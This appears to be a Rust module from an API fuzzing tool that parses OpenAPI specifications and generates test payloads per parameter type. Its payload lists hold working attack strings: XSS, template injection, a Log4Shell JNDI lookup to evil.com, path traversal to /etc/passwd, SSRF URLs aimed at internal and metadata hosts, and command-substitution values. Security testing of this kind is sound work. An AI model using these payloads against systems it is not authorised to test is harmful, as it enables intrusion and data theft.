use super::TargetPayload;
use crate::utils::validation::validate_path;
use serde::{Deserialize, Serialize};
use rustc_hash::FxHashMap;
use std::path::PathBuf;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct OpenAPISpec {
    pub openapi: String,
    pub info: ApiInfo,
    pub servers: Vec<Server>,
    pub paths: FxHashMap<String, PathItem>,
    pub components: Components,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ApiInfo {
    pub title: String,
    pub version: String,
    pub description: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Server {
    pub url: String,
    pub description: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PathItem {
    pub get: Option<Operation>,
    pub post: Option<Operation>,
    pub put: Option<Operation>,
    pub patch: Option<Operation>,
    pub delete: Option<Operation>,
    pub options: Option<Operation>,
    pub head: Option<Operation>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Operation {
    pub operation_id: Option<String>,
    pub summary: Option<String>,
    pub description: Option<String>,
    pub parameters: Vec<Parameter>,
    pub request_body: Option<RequestBody>,
    pub responses: FxHashMap<String, Response>,
    pub security: Option<Vec<SecurityRequirement>>,
    pub tags: Option<Vec<String>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Parameter {
    pub name: String,
    pub location: String,
    pub required: bool,
    pub schema: Schema,
    pub description: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RequestBody {
    pub required: bool,
    pub content: FxHashMap<String, MediaType>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct MediaType {
    pub schema: Schema,
    pub example: Option<serde_json::Value>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Schema {
    pub r#type: Option<String>,
    pub format: Option<String>,
    pub properties: Option<FxHashMap<String, Schema>>,
    pub items: Option<Box<Schema>>,
    pub enum_values: Option<Vec<serde_json::Value>>,
    pub minimum: Option<f64>,
    pub maximum: Option<f64>,
    pub min_length: Option<usize>,
    pub max_length: Option<usize>,
    pub pattern: Option<String>,
    pub required: Option<Vec<String>>,
    pub all_of: Option<Vec<Schema>>,
    pub one_of: Option<Vec<Schema>>,
    pub any_of: Option<Vec<Schema>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(rename_all = "camelCase")]
pub struct Response {
    pub description: String,
    pub content: Option<FxHashMap<String, MediaType>>,
    pub headers: Option<FxHashMap<String, serde_json::Value>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Components {
    pub schemas: Option<FxHashMap<String, Schema>>,
    pub security_schemes: Option<FxHashMap<String, SecurityScheme>>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityScheme {
    pub r#type: String,
    pub scheme: Option<String>,
    pub bearer_format: Option<String>,
    pub flows: Option<serde_json::Value>,
    pub open_id_connect_url: Option<String>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityRequirement {
    #[serde(flatten)]
    pub schemes: FxHashMap<String, Vec<String>>,
}

#[derive(Debug, Clone)]
pub struct ApiFuzzTarget {
    pub url: String,
    pub method: String,
    pub path: String,
    pub parameters: Vec<Parameter>,
    pub fuzz_points: Vec<FuzzPoint>,
}

#[derive(Debug, Clone)]
pub struct FuzzPoint {
    pub name: String,
    pub location: String,
    pub schema: Schema,
    pub fuzz_type: FuzzType,
}

#[derive(Debug, Clone)]
pub enum FuzzType {
    Integer,
    String,
    Email,
    Url,
    Uuid,
    Date,
    Boolean,
    Array,
    Object,
    Custom(String),
}

pub struct OpenAPIFuzzer {
    spec: OpenAPISpec,
    base_url: String,
}

impl OpenAPIFuzzer {
    pub fn new(spec: OpenAPISpec) -> Self {
        let base_url = spec
            .servers
            .first()
            .map(|s| s.url.clone())
            .unwrap_or_default();

        Self { spec, base_url }
    }

    pub fn parse_from_file(path: &str) -> Result<Self, Box<dyn std::error::Error + Send + Sync>> {
        let base = PathBuf::from(".");
        let validated = validate_path(&base, &PathBuf::from(path))?;
        let content = std::fs::read_to_string(&validated)?;
        let spec: OpenAPISpec = serde_json::from_str(&content)?;
        Ok(Self::new(spec))
    }

    pub fn parse_from_url(url: &str) -> Result<Self, Box<dyn std::error::Error + Send + Sync>> {
        let content = reqwest::blocking::get(url)?.text()?;
        let spec: OpenAPISpec = serde_json::from_str(&content)?;
        Ok(Self::new(spec))
    }

    pub fn generate_targets(&self) -> Vec<ApiFuzzTarget> {
        let mut targets = Vec::new();

        for (path, path_item) in &self.spec.paths {
            let methods = ["get", "post", "put", "patch", "delete", "options", "head"];

            for method in methods {
                let operation = match method {
                    "get" => &path_item.get,
                    "post" => &path_item.post,
                    "put" => &path_item.put,
                    "patch" => &path_item.patch,
                    "delete" => &path_item.delete,
                    "options" => &path_item.options,
                    "head" => &path_item.head,
                    _ => &None,
                };

                if let Some(op) = operation {
                    let fuzz_points = self.extract_fuzz_points(&op.parameters);

                    targets.push(ApiFuzzTarget {
                        url: format!("{}{}", self.base_url, path),
                        method: method.to_uppercase(),
                        path: path.clone(),
                        parameters: op.parameters.clone(),
                        fuzz_points,
                    });
                }
            }
        }

        targets
    }

    fn extract_fuzz_points(&self, parameters: &[Parameter]) -> Vec<FuzzPoint> {
        let mut points = Vec::new();

        for param in parameters {
            let fuzz_type = match param.schema.r#type.as_deref() {
                Some("integer") | Some("number") => FuzzType::Integer,
                Some("string") => {
                    if let Some(format) = &param.schema.format {
                        match format.as_str() {
                            "email" => FuzzType::Email,
                            "uri" | "url" => FuzzType::Url,
                            "uuid" => FuzzType::Uuid,
                            "date" | "date-time" => FuzzType::Date,
                            _ => FuzzType::String,
                        }
                    } else if let Some(pattern) = &param.schema.pattern {
                        FuzzType::Custom(pattern.clone())
                    } else {
                        FuzzType::String
                    }
                }
                Some("boolean") => FuzzType::Boolean,
                Some("array") => FuzzType::Array,
                Some("object") => FuzzType::Object,
                _ => FuzzType::String,
            };

            points.push(FuzzPoint {
                name: param.name.clone(),
                location: param.location.clone(),
                schema: param.schema.clone(),
                fuzz_type,
            });
        }

        points
    }

    pub fn generate_fuzz_payloads(&self, fuzz_type: &FuzzType) -> Vec<String> {
        match fuzz_type {
            FuzzType::Integer => vec![
                "0".to_string(),
                "-1".to_string(),
                "1".to_string(),
                "999999999".to_string(),
                "9223372036854775807".to_string(),
                "-9223372036854775808".to_string(),
                "0xFF".to_string(),
                "1e10".to_string(),
                "null".to_string(),
                "true".to_string(),
                "false".to_string(),
                "NaN".to_string(),
                "Infinity".to_string(),
                "-Infinity".to_string(),
            ],
            FuzzType::String => vec![
                "".to_string(),
                "a".to_string(),
                "a".repeat(100),
                "a".repeat(10000),
                "\u{0000}".to_string(),
                "\n".to_string(),
                "\r".to_string(),
                "\t".to_string(),
                "'\"".to_string(),
                "<script>alert(1)</script>".to_string(),
                "{{7*7}}".to_string(),
                "${jndi:ldap://evil.com/a}".to_string(),
                "../../../etc/passwd".to_string(),
                "test\n<script>alert(1)</script>".to_string(),
            ],
            FuzzType::Email => vec![
                "".to_string(),
                "test".to_string(),
                "test@".to_string(),
                "@example.com".to_string(),
                "test@example.com".to_string(),
                "test@localhost".to_string(),
                "test@example.com\nContent-Type: text/html\n<script>alert(1)</script>".to_string(),
                "test@example.com<svg onload=alert(1)>".to_string(),
                "admin@$(whoami).com".to_string(),
                "test@`.whoami`.com".to_string(),
            ],
            FuzzType::Url => vec![
                "".to_string(),
                "http".to_string(),
                "http://".to_string(),
                "https://localhost".to_string(),
                "https://127.0.0.1".to_string(),
                "file:///etc/passwd".to_string(),
                "dict://localhost:11211/stats".to_string(),
                "gopher://evil.com/_test".to_string(),
                "http://evil.com/".to_string(),
                "https://metadata.google.internal".to_string(),
            ],
            FuzzType::Uuid => vec![
                "00000000-0000-0000-0000-000000000000".to_string(),
                "invalid-uuid".to_string(),
                "null".to_string(),
                "12345678-1234-1234-1234-123456789abc".to_string(),
            ],
            FuzzType::Date => vec![
                "".to_string(),
                "invalid".to_string(),
                "1970-01-01".to_string(),
                "1969-12-31T23:59:59Z".to_string(),
                "3000-01-01".to_string(),
                "2023-02-30".to_string(),
                "2023-13-01".to_string(),
                "2023-01-01T00:00:00Z".to_string(),
                "2023-01-01T00:00:00+00:00".to_string(),
            ],
            FuzzType::Boolean => vec![
                "true".to_string(),
                "false".to_string(),
                "1".to_string(),
                "0".to_string(),
                "yes".to_string(),
                "no".to_string(),
                "True".to_string(),
                "FALSE".to_string(),
                "null".to_string(),
                "".to_string(),
            ],
            FuzzType::Array => vec![
                "[]".to_string(),
                "[1]".to_string(),
                "[1,2,3]".to_string(),
                "[\"\"]".to_string(),
                "[null]".to_string(),
                "[\"a\",\"b\",\"c\"]".to_string(),
                "[1,\"a\"]".to_string(),
            ],
            FuzzType::Object => vec![
                "{}".to_string(),
                "{\"a\":\"b\"}".to_string(),
                "{\"a\":1}".to_string(),
                "{\"a\":null}".to_string(),
                "{\"a\":[1,2,3]}".to_string(),
                "{\"a\":{\"b\":\"c\"}}".to_string(),
                "{\"a\":\"b\",\"c\":\"d\"}".to_string(),
            ],
            FuzzType::Custom(pattern) => {
                vec!["a".to_string(), "1".to_string(), pattern.to_string()]
            }
        }
    }
}

pub fn get_payloads() -> Vec<TargetPayload> {
    vec![
        TargetPayload {
            payload: "1".to_string(),
            description: "IDOR test - sequential ID".to_string(),
            category: "idor".to_string(),
        },
        TargetPayload {
            payload: "null".to_string(),
            description: "IDOR test - null value".to_string(),
            category: "idor".to_string(),
        },
    ]
}
